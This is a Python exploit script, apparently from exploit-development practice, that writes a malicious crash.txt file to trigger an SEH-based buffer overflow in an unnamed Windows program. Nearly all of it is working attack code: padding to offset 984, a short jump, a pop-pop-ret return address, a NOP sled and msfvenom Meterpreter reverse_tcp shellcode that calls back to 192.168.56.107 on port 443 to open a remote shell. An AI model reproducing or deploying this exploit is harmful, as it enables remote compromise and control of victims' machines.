#!/usr/bin/python3

import sys
from struct import pack

def create_file(file_name,buffer):
    with open(file_name,"wb") as file:
        file.write(buffer)
    print("Payload Created as {} bytes {}".format(file_name,str(len(buffer))))

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.107 LPORT=443 -b"\x00\x0a\x0d\x09\x20" -f py -v shellcode
#Payload size: 381 bytes
#Final size of py file: 2136 bytes
shellcode =  b""
shellcode += b"\xba\x4a\x83\xa4\x6f\xda\xd0\xd9\x74\x24\xf4"
shellcode += b"\x5e\x29\xc9\xb1\x59\x83\xee\xfc\x31\x56\x10"
shellcode += b"\x03\x56\x10\xa8\x76\x58\x87\xa3\x79\xa1\x58"
shellcode += b"\xdb\xf0\x44\x69\xc9\x67\x0c\xd8\xdd\xec\x40"
shellcode += b"\xd1\x96\xa1\x70\xe6\x1f\x0f\x5f\x73\x2d\xb8"
shellcode += b"\xae\x7c\xe0\x78\x7c\xbe\x63\x05\x7f\x93\x43"
shellcode += b"\x34\xb0\xe6\x82\x71\x06\x8c\x6b\x2f\x12\x3c"
shellcode += b"\x63\x5b\x66\xfd\xd4\x5a\xb7\x76\x9a\x24\xb2"
shellcode += b"\x49\x6e\x99\xbd\x99\x05\x79\x9e\x49\x18\xa9"
shellcode += b"\x55\x21\x02\xc8\xa3\xc6\x0e\x9b\xb8\x13\xe5"
shellcode += b"\x1a\x69\x6a\x06\x2d\x55\x21\x39\x81\x58\x3b"
shellcode += b"\x7e\x26\x83\x4e\x74\x54\x3e\x49\x4f\x26\xe4"
shellcode += b"\xdc\x4f\x80\x6f\x46\xab\x30\xa3\x11\x38\x3e"
shellcode += b"\x08\x55\x66\x23\x8f\xba\x1d\x5f\x04\x3d\xf1"
shellcode += b"\xe9\x5e\x1a\xd5\xb2\x05\x03\x4c\x1f\xeb\x3c"
shellcode += b"\x8e\xc7\x54\x99\xc5\xea\x83\x9d\x26\xf5\xab"
shellcode += b"\xc3\xb0\x39\x66\xfc\x40\x56\xf1\x8f\x72\xf9"
shellcode += b"\xa9\x07\x3e\x72\x74\xdf\x37\x94\x87\x0f\xff"
shellcode += b"\xf5\x79\xb0\xff\xdc\xbd\xe4\xaf\x76\x17\x85"
shellcode += b"\x24\x87\x98\x50\xd0\x8d\x0e\x9b\x8c\xaa\xa5"
shellcode += b"\x73\xce\xca\x38\x3f\x47\x2c\x6a\x6f\x07\xe1"
shellcode += b"\xcb\xdf\xe7\x51\xa4\x35\xe8\x8e\xd4\x35\x23"
shellcode += b"\xa7\x7f\xda\x9d\x9f\x17\x43\x84\x54\x89\x8c"
shellcode += b"\x13\x11\x89\x07\x91\xe5\x44\xe0\xd0\xf5\xb1"
shellcode += b"\x97\x1a\x06\x42\x32\x1a\x6c\x46\x94\x4d\x18"
shellcode += b"\x44\xc1\xb9\x87\xb7\x24\xba\xc0\x48\xb9\x8a"
shellcode += b"\xbb\x7f\x2f\xb2\xd3\x7f\xbf\x32\x24\xd6\xd5"
shellcode += b"\x32\x4c\x8e\x8d\x61\x69\xd1\x1b\x16\x22\x44"
shellcode += b"\xa4\x4e\x96\xcf\xcc\x6c\xc1\x38\x53\x8f\x24"
shellcode += b"\x3b\x94\x6f\xba\x14\x3d\x07\x44\x25\xbd\xd7"
shellcode += b"\x2e\xa5\xed\xbf\xa5\x8a\x02\x0f\x45\x01\x4b"
shellcode += b"\x07\xcc\xc4\x39\xb6\xd1\xcc\x9c\x66\xd1\xe3"
shellcode += b"\x04\x99\xa8\x8c\xbb\x5a\x4d\x85\xdf\x5b\x4d"
shellcode += b"\xa9\xe1\x60\x9b\x90\x97\xa7\x1f\xa7\xa8\x92"
shellcode += b"\x02\x8e\x22\xdc\x11\xd0\x66"

#offset 984
buffer = b"\x41"*980
buffer += b"\x90\x90\xeb\x12"
buffer += pack("<L",0x1003a477)
buffer += b"\x90"*24
buffer += shellcode
buffer += b"\x41"*(5000 - len(buffer))
create_file("crash.txt",buffer)
